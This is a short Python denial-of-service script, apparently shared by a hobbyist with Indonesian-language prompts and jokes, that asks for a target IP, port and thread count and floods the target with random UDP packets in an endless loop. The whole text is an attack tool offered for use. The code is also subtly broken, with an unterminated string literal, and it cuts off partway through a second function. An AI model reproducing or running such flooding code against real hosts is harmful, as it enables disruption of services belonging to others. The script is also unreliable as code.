#!/usr/bin/env python3
#Code Script Ddos Attack
import random
import socket
import threading

print("~~~ DDoS Attack GbzHnzz ~~~")
print("~~~ YouTube : GbzHnzz ~~~")
print("~~~ Discord : GbzHnz#3700 ~~~")
ip = str(input(" IP Target:"))
port = int(input(" Port Target:"))
choice = str(input(" UDP?(Y/N):"))
times = int(input(" Paket Attack:"))
threads = int(input(" Threads Yang Dikirim:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("DDOS ATTACK PAKET SHOPEE))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" NIH PAKET SHOPEENUA JANGAN LUPA BINTANG 5")
		except:
			print("[!] PAKET SHOPEENYA SUDAH SAMPAI KAKA")

def run2():
	data = random._urandom(16)
	i = random.choice(("[PAKET SAMPAI KE TUJUAN!]"))
	while True: